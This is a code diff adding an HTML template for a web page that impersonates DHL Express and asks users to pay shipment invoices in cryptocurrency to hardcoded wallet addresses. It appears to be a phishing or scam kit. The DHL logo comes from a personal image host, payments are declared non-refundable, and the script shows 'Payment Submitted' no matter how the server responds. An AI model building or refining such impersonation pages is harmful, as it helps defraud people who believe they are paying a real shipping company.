@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DHL Express – Pay with Cryptocurrency</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        :root { --dhl-red: #D40511; --dhl-dark: #1a1a1a; }
+        * { box-sizing: border-box; }
+        body { background: #f3f6fa; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; color: var(--dhl-dark); }
+        .payment-header { background: linear-gradient(135deg, var(--dhl-red) 0%, #b0040e 100%); color: #fff; padding: 1rem 1.5rem; box-shadow: 0 2px 8px rgba(212,5,17,0.2); }
+        .payment-header .brand { display: flex; align-items: center; gap: 12px; }
+        .payment-header .brand img { height: 38px; filter: brightness(0) invert(1); }
+        .payment-header .brand h1 { font-size: 1.25rem; font-weight: 700; margin: 0; }
+        .payment-card { background: #fff; max-width: 700px; margin: 2rem auto; padding: 2rem; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e5e7eb; position: relative; }
+        .payment-card .step-indicator { font-size: 0.8rem; color: #6b7280; margin-bottom: 1.5rem; border-bottom: 1px solid #e5e7eb; padding-bottom: 0.75rem; }
+        .payment-card .step-indicator strong { color: var(--dhl-red); }
+        .form-label { font-weight: 600; font-size: 0.85rem; color: #4a5568; }
+        .form-control, .form-select { border-radius: 0; border: 1px solid #d1d5db; padding: 0.5rem 0.75rem; font-size: 0.9rem; }
+        .form-control:focus, .form-select:focus { border-color: var(--dhl-red); box-shadow: 0 0 0 3px rgba(212,5,17,0.1); }
+        .btn-pay { background: #f7931a; color: #fff; border: none; padding: 0.6rem 1.8rem; font-weight: 600; transition: all 0.2s; display: inline-flex; align-items: center; gap: 8px; }
+        .btn-pay:hover:not(:disabled) { background: #e6830c; }
+        .btn-pay:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { border-radius: 0; }
+        .payment-summary { background: #f8fafc; padding: 0.8rem 1rem; border: 1px solid #e5e7eb; margin-bottom: 1.5rem; }
+        .payment-summary .total-amount { font-weight: 700; font-size: 1.4rem; color: var(--dhl-dark); }
+        .crypto-address { background: #f0fdf4; border: 1px solid #86efac; padding: 1rem; margin-bottom: 1.5rem; }
+        .crypto-address .address-row { display: flex; justify-content: space-between; align-items: center; padding: 0.2rem 0; flex-wrap: wrap; gap: 4px; }
+        .crypto-address .label { color: #166534; font-weight: 600; }
+        .crypto-address .value { font-family: monospace; background: white; padding: 0.2rem 0.5rem; border: 1px solid #bbf7d0; font-size: 0.9rem; word-break: break-all; flex: 1; min-width: 150px; }
+        .crypto-address .copy-btn { background: none; border: none; color: var(--dhl-red); cursor: pointer; padding: 0 8px; font-size: 1.2rem; }
+        .footer { text-align: center; padding: 2rem 1rem 1rem; color: #94a3b8; font-size: 0.8rem; }
+
+        /* Overlay for pending/confirmation */
+        #resultOverlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.92);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            padding: 2rem;
+            z-index: 10;
+            text-align: center;
+        }
+        #resultOverlay.show { display: flex; }
+        #resultOverlay .spinner { width: 3rem; height: 3rem; }
+        #resultOverlay .pending-icon { font-size: 4rem; color: #f59e0b; margin-bottom: 1rem; }
+        #resultOverlay h4 { font-weight: 700; color: var(--dhl-dark); }
+        #resultOverlay p { color: #6b7280; max-width: 400px; }
+
+        @media (max-width: 576px) {
+            .payment-card { padding: 1.2rem 1rem; margin: 1rem 0.5rem; }
+            .crypto-address .address-row { flex-direction: column; align-items: flex-start; gap: 4px; }
+            .crypto-address .value { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <header class="payment-header d-flex justify-content-between align-items-center flex-wrap gap-2">
+        <div class="brand">
+            <img src="https://res.cloudinary.com/de1ucsg6q/image/upload/v1787778296/IMG_7646_scvhxj.jpg" alt="DHL">
+            <h1>Pay with Cryptocurrency</h1>
+        </div>
+        <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-outline-light btn-sm">
+            <i class="bi bi-arrow-left me-1"></i> Back
+        </a>
+    </header>
+
+    <div class="payment-card">
+        <div class="step-indicator"><strong>Step 2 of 2</strong> — Send crypto payment</div>
+
+        <!-- Payment Summary -->
+        <div class="payment-summary">
+            <div class="d-flex justify-content-between align-items-center flex-wrap">
+                <div>
+                    <div class="text-muted" style="font-size:0.85rem;">Total due</div>
+                    <div class="total-amount" id="totalAmount">$0.00</div>
+                </div>
+                <span class="badge bg-light text-dark" id="invoiceCount">0 invoice(s)</span>
+            </div>
+            <div class="mt-1" style="font-size:0.8rem; color:#4a5568;" id="trackingList"></div>
+        </div>
+
+        <!-- Crypto address display -->
+        <div class="crypto-address">
+            <div class="fw-bold mb-2" style="color: #166534;">📤 Send to the following address</div>
+            <div class="address-row">
+                <span class="label">Coin</span>
+                <span><strong id="selectedCoinLabel">BTC</strong> (Bitcoin)</span>
+            </div>
+            <div class="address-row">
+                <span class="label">Address</span>
+                <span class="value" id="cryptoAddress">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
+                <button class="copy-btn" onclick="copyAddress()"><i class="bi bi-clipboard"></i></button>
+            </div>
+            <div class="address-row">
+                <span class="label">Amount to send</span>
+                <span id="cryptoAmountDisplay" style="font-weight:600; font-family: monospace;">0.000000</span>
+            </div>
+            <div class="address-row mt-2">
+                <span class="label">Network</span>
+                <span id="networkDisplay">BTC (Mainnet)</span>
+            </div>
+            <div class="mt-2 text-muted" style="font-size:0.8rem;">
+                <i class="bi bi-info-circle me-1"></i> Payment is confirmed after 2 network confirmations.
+            </div>
+        </div>
+
+        <!-- Form -->
+        <form id="cryptoForm">
+            <input type="hidden" name="email" value="{{ email }}">
+            <input type="hidden" name="payment_method" value="Crypto">
+            <input type="hidden" name="tracking_numbers" id="trackingNumbersHidden" value="">
+
+            <div class="mb-3">
+                <label for="cryptoCoin" class="form-label">Select Cryptocurrency</label>
+                <select class="form-select" id="cryptoCoin" name="crypto_coin">
+                    <option value="BTC">Bitcoin (BTC)</option>
+                    <option value="ETH">Ethereum (ETH)</option>
+                    <option value="USDC">USD Coin (USDC - ERC20)</option>
+                    <option value="BCH">Bitcoin Cash (BCH)</option>
+                </select>
+            </div>
+            <div class="mb-3">
+                <label for="transactionHash" class="form-label">Transaction Hash / TXID</label>
+                <input type="text" class="form-control" id="transactionHash" name="transaction_hash" placeholder="e.g. 0x... or BTC TXID" required>
+            </div>
+            <div class="mb-3">
+                <label for="cryptoAmount" class="form-label">Amount Sent (in the chosen currency)</label>
+                <input type="text" class="form-control" id="cryptoAmount" name="crypto_amount" placeholder="e.g. 0.005 BTC" required>
+            </div>
+
+            <div id="cardErrors" class="alert alert-danger d-none"></div>
+
+            <div class="d-flex justify-content-between align-items-center mt-3 flex-wrap gap-2">
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary">Cancel</a>
+                <button type="submit" class="btn-pay" id="payBtn">
+                    <i class="bi bi-check-circle me-1"></i> Confirm Payment
+                </button>
+            </div>
+        </form>
+
+        <!-- Overlay for pending state -->
+        <div id="resultOverlay">
+            <div id="spinnerContainer">
+                <div class="spinner-border spinner text-warning" role="status">
+                    <span class="visually-hidden">Processing...</span>
+                </div>
+                <h4 class="mt-3">Processing your payment...</h4>
+            </div>
+            <div id="pendingContainer" style="display:none;">
+                <div class="pending-icon"><i class="bi bi-clock-history"></i></div>
+                <h4>Payment Submitted</h4>
+                <p>Your crypto payment details have been received. Our team will verify the transaction and update your invoice status shortly.</p>
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-pay mt-3">
+                    <i class="bi bi-arrow-left me-1"></i> Back to Invoices
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer"><small>Cryptocurrency payments are non-refundable.</small></div>
+
+    <script>
+        // ============================================================
+        // CONFIG: Hardcoded addresses and exchange rates (USD per coin)
+        // ============================================================
+        const CRYPTO_CONFIG = {
+            BTC: {
+                address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
+                network: 'Bitcoin (Mainnet)',
+                label: 'Bitcoin',
+                rate: 0.000023  // 1 USD = 0.000023 BTC
+            },
+            ETH: {
+                address: '0x742d35Cc6634C0532925a3b844Bc9e7598f7bDd5',
+                network: 'Ethereum (Mainnet)',
+                label: 'Ethereum',
+                rate: 0.0003    // 1 USD = 0.0003 ETH
+            },
+            USDC: {
+                address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                network: 'Ethereum (ERC20)',
+                label: 'USD Coin',
+                rate: 1.0       // 1 USD = 1 USDC
+            },
+            BCH: {
+                address: '1BoatSLRHtKNngkdXEeobR76b53LETtpyT',
+                network: 'Bitcoin Cash (Mainnet)',
+                label: 'Bitcoin Cash',
+                rate: 0.002     // 1 USD = 0.002 BCH
+            }
+        };
+
+        // ============================================================
+        // LOAD DATA FROM QUERY PARAMETERS
+        // ============================================================
+        function getQueryParam(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+
+        const email = getQueryParam('email') || '';
+        const trackingParam = getQueryParam('tracking') || '';
+        const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
+
+        document.getElementById('trackingNumbersHidden').value = trackingNumbers.join(',');
+
+        const trackingListEl = document.getElementById('trackingList');
+        if (trackingNumbers.length === 1) {
+            trackingListEl.textContent = 'Shipment: ' + trackingNumbers[0];
+        } else if (trackingNumbers.length > 1) {
+            trackingListEl.textContent = 'Shipments: ' + trackingNumbers.join(', ');
+        } else {
+            trackingListEl.textContent = 'No shipments selected.';
+        }
+        document.getElementById('invoiceCount').textContent = trackingNumbers.length + ' invoice(s)';
+
+        // Total amount in USD (hardcoded for demo, you can compute from invoices)
+        const totalUSD = trackingNumbers.length * 50;  // placeholder
+        document.getElementById('totalAmount').textContent = '$' + totalUSD.toFixed(2);
+
+        // ============================================================
+        // UPDATE CRYPTO INFO ON COIN CHANGE
+        // ============================================================
+        function updateCryptoInfo() {
+            const coin = document.getElementById('cryptoCoin').value;
+            const config = CRYPTO_CONFIG[coin];
+            if (!config) return;
+
+            document.getElementById('selectedCoinLabel').textContent = coin;
+            document.getElementById('cryptoAddress').textContent = config.address;
+            document.getElementById('networkDisplay').textContent = config.network;
+
+            // Calculate amount
+            const rate = config.rate;
+            const cryptoAmount = totalUSD * rate;
+            document.getElementById('cryptoAmountDisplay').textContent = cryptoAmount.toFixed(6) + ' ' + coin;
+            document.getElementById('cryptoAmount').placeholder = 'e.g. ' + cryptoAmount.toFixed(6) + ' ' + coin;
+        }
+
+        document.getElementById('cryptoCoin').addEventListener('change', updateCryptoInfo);
+        updateCryptoInfo(); // initial
+
+        // ============================================================
+        // COPY ADDRESS
+        // ============================================================
+        function copyAddress() {
+            const addr = document.getElementById('cryptoAddress').textContent;
+            navigator.clipboard.writeText(addr).then(() => {
+                alert('Address copied to clipboard!');
+            }).catch(() => {
+                // Fallback
+                const textArea = document.createElement('textarea');
+                textArea.value = addr;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                alert('Address copied to clipboard!');
+            });
+        }
+
+        // ============================================================
+        // FORM SUBMISSION – Show spinner, then pending, then redirect
+        // ============================================================
+        document.getElementById('cryptoForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Validate fields
+            const tx = document.getElementById('transactionHash').value.trim();
+            const amount = document.getElementById('cryptoAmount').value.trim();
+            const errEl = document.getElementById('cardErrors');
+
+            if (!tx) {
+                errEl.textContent = 'Please enter the transaction hash.';
+                errEl.classList.remove('d-none');
+                return;
+            }
+            if (!amount) {
+                errEl.textContent = 'Please enter the amount you sent.';
+                errEl.classList.remove('d-none');
+                return;
+            }
+            errEl.classList.add('d-none');
+
+            // Disable button
+            const btn = document.getElementById('payBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';
+
+            // Show overlay with spinner
+            const overlay = document.getElementById('resultOverlay');
+            const spinner = document.getElementById('spinnerContainer');
+            const pending = document.getElementById('pendingContainer');
+            overlay.classList.add('show');
+            spinner.style.display = 'block';
+            pending.style.display = 'none';
+
+            // Prepare payload
+            const formData = new FormData(this);
+            const coin = formData.get('crypto_coin');
+            const config = CRYPTO_CONFIG[coin];
+            const payload = {
+                email: formData.get('email'),
+                payment_method: formData.get('payment_method'),
+                tracking_numbers: formData.get('tracking_numbers').split(',').filter(s => s.trim()),
+                crypto_details: {
+                    coin: coin,
+                    address: config.address,
+                    network: config.network,
+                    amount_usd: totalUSD,
+                    amount_crypto: amount,
+                    transaction_hash: tx,
+                },
+                // also include some billing info if needed
+            };
+
+            // Send to backend
+            fetch('{{ url_for("billing_pay") }}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(r => r.json())
+            .then(data => {
+                // Regardless of response, show pending
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    pending.style.display = 'block';
+                }, 1200);
+            })
+            .catch(() => {
+                // On network error, still show pending
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    pending.style.display = 'block';
+                }, 1200);
+            });
+
+            // Fallback: show pending after 4 seconds even if fetch hangs
+            setTimeout(() => {
+                if (spinner.style.display !== 'none') {
+                    spinner.style.display = 'none';
+                    pending.style.display = 'block';
+                }
+            }, 4000);
+        });
+
+        // If no tracking numbers, show error
+        if (trackingNumbers.length === 0) {
+            document.getElementById('cardErrors').textContent = 'No shipments selected. Please go back and select at least one invoice.';
+            document.getElementById('cardErrors').classList.remove('d-none');
+            document.getElementById('payBtn').disabled = true;
+        }
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
